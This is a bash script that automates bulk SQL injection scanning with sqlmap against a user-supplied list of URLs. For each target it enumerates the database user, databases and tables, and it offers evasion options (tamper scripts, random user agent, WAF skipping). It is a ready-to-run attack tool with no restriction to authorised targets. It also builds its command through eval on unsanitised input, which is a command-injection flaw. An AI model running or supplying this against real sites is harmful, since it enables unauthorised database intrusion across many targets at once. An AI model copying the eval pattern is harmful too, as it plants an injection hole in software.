#!/bin/bash

echo "=== SQLMap Bulk Scanner (from file) ==="

# Ask for the input file with URLs
read -p "Enter path to file with URLs (e.g., urls.txt): " url_file

# Check if file exists
if [[ ! -f "$url_file" ]]; then
  echo "File not found: $url_file"
  exit 1
fi

# Prompt for required parameters
read -p "Enter the cookie string (if any, or press Enter to skip): " cookie
read -p "Enter risk level (1-3, default 1): " risk
read -p "Enter level (1-5, default 1): " level

# Prompt for advanced options
read -p "Enter tamper script (if any, e.g., tamper/space2comment, or press Enter to skip): " tamper
read -p "Enter answers (if any, e.g., \"follow=Y\" or press Enter to skip): " answers
read -p "Use --flush-session? (y/n): " flush
read -p "Use --fresh-queries? (y/n): " fresh
read -p "Use --skip-waf? (y/n): " skipwaf
read -p "Enter thread count (default is 1, or specify number): " threads

# Set defaults if empty
risk="${risk:-1}"
level="${level:-1}"
threads="${threads:-1}"

# Create output directory
mkdir -p sqlmap_results

counter=1
while IFS= read -r url
do
  # Skip empty lines
  if [[ -z "$url" ]]; then
    continue
  fi

  echo "[+] Scanning URL #$counter: $url"

  # Sanitize directory name
  clean_url=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g')
  output_dir="sqlmap_results/output_${counter}_${clean_url}"
  
  # Build common options
  options="-u \"$url\" --batch --current-user --dbs --tables"
  options+=" --risk=$risk --dbms=mysql  --level=$level --threads=$threads --random-agent --output-dir=\"$output_dir\""

  [[ -n "$cookie" ]] && options+=" --cookie=\"$cookie\""
  [[ -n "$tamper" ]] && options+=" --tamper=$tamper"
  [[ -n "$answers" ]] && options+=" --answers=\"$answers\""
  [[ "$flush" =~ ^[Yy]$ ]] && options+=" --flush-session"
  [[ "$fresh" =~ ^[Yy]$ ]] && options+=" --fresh-queries"
  [[ "$skipwaf" =~ ^[Yy]$ ]] && options+=" --skip-waf"

  # Run sqlmap
  eval sqlmap $options

  echo "[+] Output for URL #$counter saved in $output_dir"
  echo ""
  ((counter++))

done < "$url_file"

